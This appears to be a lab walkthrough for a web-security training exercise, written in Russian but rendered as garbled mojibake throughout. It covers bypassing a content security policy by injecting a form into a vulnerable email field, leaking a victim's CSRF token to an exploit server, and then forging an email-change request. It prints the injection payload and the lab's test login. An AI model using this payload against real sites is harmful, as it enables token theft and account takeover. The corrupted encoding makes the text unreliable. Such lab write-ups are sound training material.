## üõ°Ô∏è –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏ —Å –∑–∞—â–∏—Ç–æ–π CSP —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º XSS

–≠—Ç–∞ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å—Ç—Ä–æ–≥—É—é –ø–æ–ª–∏—Ç–∏–∫—É CSP, –∫–æ—Ç–æ—Ä–∞—è –±–ª–æ–∫–∏—Ä—É–µ—Ç –∏—Å—Ö–æ–¥—è—â–∏–µ –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –≤–Ω–µ—à–Ω–∏–µ –≤–µ–±-—Å–∞–π—Ç—ã.

–ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—É—é —Ä–∞–±–æ—Ç—É, —Å–Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –∞—Ç–∞–∫—É XSS, –∫–æ—Ç–æ—Ä–∞—è –æ–±—Ö–æ–¥–∏—Ç CSP –∏ –∏–∑–≤–ª–µ–∫–∞–µ—Ç CSRF-—Ç–æ–∫–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è-–∂–µ—Ä—Ç–≤—ã —Å –ø–æ–º–æ—â—å—é Burp Collaborator. –ó–∞—Ç–µ–º –∏–∑–º–µ–Ω–∏—Ç–µ –∞–¥—Ä–µ—Å —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è-–∂–µ—Ä—Ç–≤—ã –Ω–∞ `hacker@evil-user.net`.

–í–∞—à –≤–µ–∫—Ç–æ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ª–æ–≤–æ "–©–µ–ª—á–æ–∫", —á—Ç–æ–±—ã –ø–æ–±—É–¥–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è-–∂–µ—Ä—Ç–≤—É –∫–ª–∏–∫–Ω—É—Ç—å –Ω–∞ –Ω–µ–≥–æ. –ù–∞–ø—Ä–∏–º–µ—Ä:

```html
<a href="">–©–µ–ª–∫–Ω–∏—Ç–µ —Å—é–¥–∞</a>
```

–í—ã –º–æ–∂–µ—Ç–µ –≤–æ–π—Ç–∏ –≤ —Å–≤–æ—é —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â–∏–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: `wiener:peter`

### –®–∞–≥–∏:

1. **–í–æ–π–¥–∏—Ç–µ** –≤ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏—é, –∏—Å–ø–æ–ª—å–∑—É—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–µ –≤—ã—à–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.

2. **–ò—Å—Å–ª–µ–¥—É–π—Ç–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã** –∏ –æ–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø–∞—Ä–∞–º–µ—Ç—Ä `email` —É—è–∑–≤–∏–º –¥–ª—è XSS.

3. **–ü–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤** –∏ –¥–æ–±–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–π –∫–æ–¥, –∑–∞–º–µ–Ω–∏–≤ `YOUR.LAB.URL` –∏ `YOUR.EXPLOIT.URL` –Ω–∞ URL –≤–∞—à–µ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏ –∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–µ—Ä–≤–µ—Ä–∞ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ:

   ```html
   <script>
   window.location = "https://YOUR.LAB.URL/my-account?email=%22%3E%3C/form%3E%3Cform%20action=%22https://YOUR.EXPLOIT.URL/exploit%22%3E%3Cbutton%20type=%22Submit%22%3E–©–µ–ª–∫–Ω–∏—Ç–µ —Å—é–¥–∞%3C/button%3E";
   </script>
   ```

4. **–°–æ—Ö—Ä–∞–Ω–∏—Ç–µ** —ç–∫—Å–ø–ª–æ–π—Ç –∏ –∑–∞—Ç–µ–º **–¥–æ—Å—Ç–∞–≤—å—Ç–µ** –µ–≥–æ –∂–µ—Ä—Ç–≤–µ. –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ—Å–µ—Ç–∏—Ç –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É —Å —ç—Ç–∏–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º —Å–∫—Ä–∏–ø—Ç–æ–º –∏ –Ω–∞–∂–º–µ—Ç —Å—Å—ã–ª–∫—É "–©–µ–ª–∫–Ω–∏—Ç–µ —Å—é–¥–∞", –Ω–∞—Ö–æ–¥—è—Å—å –≤ —Å–≤–æ–µ–π —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏, –µ–≥–æ –±—Ä–∞—É–∑–µ—Ä –æ—Ç–ø—Ä–∞–≤–∏—Ç –∑–∞–ø—Ä–æ—Å —Å CSRF-—Ç–æ–∫–µ–Ω–æ–º –Ω–∞ –≤–∞—à –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –≤–µ–±-—Å–∞–π—Ç.

   ![image](https://github.com/user-attachments/assets/9e6709fe-b140-4679-9268-e09026ce1c14)

5. **–ü–æ–ª—É—á–∏—Ç–µ CSRF-—Ç–æ–∫–µ–Ω** –∏–∑ —Ä–∞–∑–¥–µ–ª–∞ "–ñ—É—Ä–Ω–∞–ª—ã" –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤.

   ![image](https://github.com/user-attachments/assets/c497c3dd-c94f-4096-bb9e-9be456a8090d)

6. **–í–∫–ª—é—á–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ Burp** –∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –∫ —Ñ—É–Ω–∫—Ü–∏–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –≤ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∑–∞–ø—Ä–æ—Å –Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –Ω–∞ –ª—é–±–æ–µ —Å–ª—É—á–∞–π–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ.

   ![image](https://github.com/user-attachments/assets/18bbc9c8-5bec-4d99-961b-583c907c4298)

7. **–í Burp**, –∏–∑–º–µ–Ω–∏—Ç–µ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å:
   - –ü–æ–º–µ–Ω—è–π—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `email` –Ω–∞ `any@domain.com`.

8. **–°–≥–µ–Ω–µ—Ä–∏—Ä—É–π—Ç–µ CSRF PoC**:
   - –©–µ–ª–∫–Ω–∏—Ç–µ –ø—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏ –ø–æ –∑–∞–ø—Ä–æ—Å—É –∏ –≤—ã–±–µ—Ä–∏—Ç–µ **Engagement tools > Generate CSRF PoC**.
   - –ó–∞–º–µ–Ω–∏—Ç–µ —Ç–æ–∫–µ–Ω CSRF –≤ –∑–∞–ø—Ä–æ—Å–µ –Ω–∞ —Ç–æ–∫–µ–Ω, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ä–∞–Ω–µ–µ –∏–∑–≤–ª–µ–∫–ª–∏.

   ![image](https://github.com/user-attachments/assets/38710d6f-6333-453e-84b7-bd598089eec4)

9. **–†–µ–≥–µ–Ω–µ—Ä–∏—Ä—É–π—Ç–µ CSRF HTML**:
   - –ù–∞–∂–º–∏—Ç–µ "Regenerate", —á—Ç–æ–±—ã –æ–±–Ω–æ–≤–∏—Ç—å CSRF HTML —Å —É–∫—Ä–∞–¥–µ–Ω–Ω—ã–º —Ç–æ–∫–µ–Ω–æ–º, –∑–∞—Ç–µ–º –Ω–∞–∂–º–∏—Ç–µ "Copy HTML", —á—Ç–æ–±—ã —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –µ–≥–æ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞.

10. **–û—Ç–º–µ–Ω–∏—Ç–µ –∑–∞–ø—Ä–æ—Å** –∏ –æ—Ç–∫–ª—é—á–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ Burp.

11. **–í–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤** –∏ –≤—Å—Ç–∞–≤—å—Ç–µ CSRF HTML –≤ —Ç–µ–ª–æ, –∑–∞–º–µ–Ω–∏–≤ —Ä–∞–Ω–µ–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç.

12. **–°–æ—Ö—Ä–∞–Ω–∏—Ç–µ** —ç–∫—Å–ø–ª–æ–π—Ç –∏ **–¥–æ—Å—Ç–∞–≤—å—Ç–µ** –µ–≥–æ –∂–µ—Ä—Ç–≤–µ. –ê–¥—Ä–µ—Å —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –±—É–¥–µ—Ç –∏–∑–º–µ–Ω–µ–Ω –Ω–∞ `any@domain.com`.
